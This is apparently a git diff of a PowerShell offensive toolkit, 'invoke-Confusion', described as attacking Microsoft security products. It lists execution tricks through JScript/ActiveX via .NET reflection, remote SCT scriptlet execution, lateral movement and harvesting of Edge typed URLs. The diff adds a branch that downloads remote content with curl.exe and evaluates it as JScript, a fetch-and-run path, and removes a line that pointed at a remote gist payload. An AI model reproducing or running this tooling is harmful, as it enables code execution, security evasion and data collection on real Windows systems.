@@ -47,10 +47,10 @@
 
 
   .Description
-      Adaptive Confusions Powershell About attacking Places Secure From Some Products Microsofot With of some of the Executive methods of the system TTPs => APT LMMT
+      Adaptive confusions Powershell about attacking places secure from some products Microsoft with of some of the executive methods of the system
  
   .Broadly
-    This makes you progressively advanced About Attacks Powershell
+    This make your edge progressively advanced About Attacks Powershell
   
 
   .Example
@@ -62,7 +62,7 @@
   
 
   .Example
-    PS:> invoke-SCTExecution -SCT URL.SCT
+    PS:> Invoke-COMScriptlet -SCT URL.SCT
 
 
   .Example 
@@ -106,9 +106,9 @@ $obj = '''
 
 Author Mat harr0ey @harr0ey
 
-  ( Should You Accept These Conditions )
-1 Reject Manipulate in Modules invoke-Confusion!
-2 Permit Use: Pertain For Red Teamer Only!
+   You should accept these of the stipulations 
+1 Powershell is reject manipulate in modules invoke-Confusion!
+2 regarding this permit for the use: pertain for Red Teamer only!
 3 Exit!
 '''
 [void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")
@@ -123,10 +123,15 @@ Write-Host -ForegroundColor Green "
 | | | | \ V / (_) |   <  __/      | \__/\ (_) | | | | | | |_| \__ \ | (_) | | | |
 |_|_| |_|\_/ \___/|_|\_\___|       \____/\___/|_| |_|_|  \__,_|___/_|\___/|_| |_|
 ---------------------------------------------------------------------------------
+|===============|
+|= PowerAvails =|
+|=             =|
+|=======================>   https://github.com/homjxi0e/PowerAvails
+
 
 1  invoke-ConfusionJS -Command 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
 2  invoke-Confusions-LLMTCOMCLSID -CLSID 
-3  invoke-SCTExecution -SCT www.gist.githubusercontent.com/homjxi0e/cc9e5f07308745be89288834ca567d22/raw/1e3d2e5f2a663d339d6cc60d27e7e5e4e0827873/SCTEx.sct
+3  Invoke-COMScriptlet -SCT 
 4  invoke-DLLLaunchApplication -CML calc.exe
 5  invoke-lateralmovement -Command calc.exe
 6  invoke-VBNET -CMLShell calc.exe
@@ -136,10 +141,9 @@ Write-Host -ForegroundColor Green "
 10 invoke-ApplicationShellExecute -CML calc.exe  
 11 invoke-ADinfo -Type List    
 12 Get-TokenMsftEdge -Type List
-13 invoke-URLPSShell -URI URL!                                                                      
-                                                                                 
+13 invoke-URLPSShell -URI URL!                                                                                                                                                   
 "
-Read-Host -Prompt Enter
+$obj_ = Read-Host -Prompt Enter
 
 
  function invoke-DxCap {
@@ -175,7 +179,6 @@ Read-Host -Prompt Enter
     )
 
 
-
     if ($like = $CML) {
     
      $ADDValueOpenWith = $CML
@@ -189,7 +192,6 @@ Read-Host -Prompt Enter
 function invoke-GenerateObf {
 
  <#
- 
 
  .Author Matt harr0ey @harr0ey
  .License BSD3
@@ -201,8 +203,6 @@ function invoke-GenerateObf {
 
  .Exmaple 
   PS:> invoke-GenerateObf -Type strings
- 
- 
  
  #>
 
@@ -229,7 +229,6 @@ function invoke-GenerateObf {
       
       
       }Catch {
-      
       
       throw "Write-Host 'Mistake because input Your Strings ' "
       
@@ -267,10 +266,10 @@ function invoke-help {
 
 1  invoke-ConfusionJS -Command 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
 2  invoke-Confusions-LLMTCOMCLSID -CLSID 
-3  invoke-SCTExecution -SCT  http:///local.sct/
+3  Invoke-COMScriptlet -SCT  http:///local.sct/
 4  invoke-DLLLaunchApplication -CML calc.exe
 5  invoke-lateralmovement -Command calc.exe
-6  invoke-VBNET -CMLShell calc.exe
+6  invoke-VBNET -CMLShell calc.exe                   
 7  invoke-XMLTransform -XSL URL -XML URL
 8  invoke-OpenWith -CML notepad.exe
 9  invoke-DxCap -CML notepad.exe
@@ -453,23 +452,15 @@ function invoke-URLPSShell {
 
 if ($null = $Type) {
 
-
-
 $SnifferEdgedrag = Join-Path -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\" -ChildPath TypedURLs
-
-
 
 Get-ItemProperty -Path $SnifferEdgedrag 
 
    ( Out-String )
-
   
 
   }
    }
-
-
-
 
  function invoke-OpenWith {
 
@@ -638,7 +629,7 @@ var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
      }
   }
 
- function invoke-SCTExecution {
+ function Invoke-COMScriptlet {
 
  
   [CmdletBinding()]
@@ -758,12 +749,12 @@ function invoke-ConfusionJS {
 
   .Broadly Execution JSCript Via .NET in Reflection Assembly To Excution ActiveX
 
-  .Parameter Everything valid
+  .Parameter everything is valid
 
  
-  .Parameter Binding Execution valid
+  .Parameter Binding Execution is valid
  
-  .Parameter Powershell File valid
+  .Parameter Powershell File is valid
 
 
 #>
@@ -772,26 +763,28 @@ function invoke-ConfusionJS {
 
    param (
    
-     [Parameter(Mandatory=$true)]
+     [Parameter(Mandatory=$false)]
     
-     [Parameter(Position = 0, ParameterSetName = 'Command')]
-    
-     [String]$Command
- 
+     [Parameter(Position = 0, ParameterSetName = 'Command')]    
+     [String]$Command,$Remote
  )
 
    if ($null = $Command) {
         Write-Host ""
-            [Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript')
-    
-                $attack = $Command
-   
-                      [Microsoft.JScript.Eval]::JScriptEvaluate($attack,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+                [Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript')
+                $Attack = $Command
+		[void] [Microsoft.JScript.Eval]::JScriptEvaluate($attack,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
       # Will Add Value in This Spaces
       # 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
 
    }
+elseif ($like = $Remote) {
 
+ $MMCC002=curl.exe --basic "$Remote"
+ [Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript')
+ [Microsoft.JScript.Eval]::JScriptEvaluate($MMCC002,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+
+}
 }
 
 function invoke-Confusions-LLMTCOMCLSID {
